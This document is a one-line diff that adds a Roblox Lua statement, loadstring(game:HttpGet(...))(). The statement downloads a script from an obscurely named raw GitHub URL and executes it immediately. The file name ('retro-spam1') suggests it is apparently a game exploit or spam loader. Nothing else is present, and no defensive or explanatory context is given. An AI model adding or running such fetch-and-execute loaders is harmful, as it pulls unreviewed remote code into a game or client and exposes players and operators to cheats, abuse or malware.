@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/upd-8-cvr-retro-spam1-dyrnpw87gx8wo4.lua"))()
